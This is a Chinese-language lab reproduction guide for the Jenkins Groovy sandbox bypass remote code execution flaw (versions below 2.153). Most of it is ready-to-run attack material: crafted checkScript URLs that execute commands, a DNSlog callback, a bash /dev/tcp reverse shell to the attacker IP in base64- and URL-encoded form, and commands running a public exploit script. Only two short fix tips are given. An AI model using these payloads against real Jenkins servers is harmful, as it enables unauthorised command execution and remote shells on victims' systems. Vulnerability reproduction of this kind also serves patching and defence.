# 0x01 漏洞概述

Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。

通过这个漏洞，我们可以找到很多可供利用的利用链。

其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。

# 0x02 影响版本
Jenkins < 2.153 ，

Jenkins LTS < 2.138.3 

Jenkins <= 2.137 可以绕过权限校验直接进⾏利⽤

2.138 <= Jenkins < 2.153 就需要经过权限校验才能够进⾏利⽤

在 Jenkins 中如果没有开启 “匿名者具有可读权限” 的话，那么我们请求的路有会⾸先经过⽩名单校验，但是在 Jenkins 2.137 之前可以通过⼀些在⽩名单的前缀从⽽绕过权限校验。


# 0x03 环境搭建
靶机：http://192.168.210.164:8080/

攻击机：192.168.210.152

![image](https://user-images.githubusercontent.com/84888757/162634258-45f177f3-8f88-4cac-aa92-e9c8bc1c8dbe.png)


# 0x04 漏洞复现
## 4.1判断Jenkins版本信息
### 1、指纹识别插件判断版本信息

![image](https://user-images.githubusercontent.com/84888757/162634457-aecf862e-3135-44c0-8a3e-50eb46f2373b.png)

### 2、curl 判断版本信息
```curl -s -I http://192.168.210.164:8080/| grep X-Jenkins```

![image](https://user-images.githubusercontent.com/84888757/162634472-1554f3db-3c44-41ce-a602-1f9725101284.png)

## 4.2 手工测试
### 1、漏洞验证
目标机器出网情况下，使用dnslog平台进行漏洞验证
```
http://192.168.210.164:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript
?sandbox=true&value=public class x {public x(){"curl 2222.xxxx.ceye.io".execute()}}
```

![image](https://user-images.githubusercontent.com/84888757/162634527-c895a3b7-8080-4364-829e-592a9ebc793f.png)

如果机器不出网，则将命令改成`touch filename`一类的，然后手工探测是否成功创建文件。

### 2、反弹shell
原始语句
```
bash -i >&/dev/tcp/192.168.210.152/9988 0>&1
```

base64编码
```
bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMjEwLjE1Mi85OTg4IDA+JjE=}|{base64,-d}|{bash,-i}
```

再进行一次url编码
```
bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJi9kZXYvdGNwLzE5Mi4xNjguMjEwLjE1Mi85OTg4IDA%2BJjE%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D
```

然后执行下述命令
```
http://x.x.x.x:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20{public%20x(){%22命令替换%22.execute()}}
```

🌰 在本次复现实例中，命令如下：
```
http://192.168.210.164:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20{public%20x(){%22bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJi9kZXYvdGNwLzE5Mi4xNjguMjEwLjE1Mi85OTg4IDA%2BJjE%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22.execute()}}
```

如下出现空白页面说明执行成功：

![image](https://user-images.githubusercontent.com/84888757/162634606-415bbaee-b25f-4a17-bf02-c8cb6dd0b8a6.png)


这样即可获取到反弹的shell：

![image](https://user-images.githubusercontent.com/84888757/162634614-82c2812f-d3ee-4f00-a759-0190dd2bcb1d.png)


## 4.3 exp使用
- 🔗 [awesome-jenkins-rce-2019-exp](https://github.com/orangetw/awesome-jenkins-rce-2019)

### 1、dnslog验证漏洞
```
python2 exp.py http://192.168.210.164:8080/ 'curl 3333.xxxx.ceye.io'
```

![image](https://user-images.githubusercontent.com/84888757/162634671-8cb67add-5924-491e-99c8-790f45a16bd3.png)


### 2、反弹shell
原始语句
```
bash -i >&/dev/tcp/192.168.210.152/9988 0>&1
```

base64编码
```
bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMjEwLjE1Mi85OTg4IDA+JjE=}|{base64,-d}|{bash,-i}
```

使用exp.py
```
python2 exp.py http://192.168.210.164:8080/ 'bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMjEwLjE1Mi85OTg4IDA+JjE=}|{base64,-d}|{bash,-i}'
```

![image](https://user-images.githubusercontent.com/84888757/162634714-48e54ee7-1a15-405c-b789-9bace4d5b423.png)


# 0x05 修复建议
1、升级到最新版

2、尽量不要开放到公网

# 0x06 参考链接
- https://www.cnblogs.com/cute-puli/p/15378440.html
- https://github.com/orangetw/awesome-jenkins-rce-2019


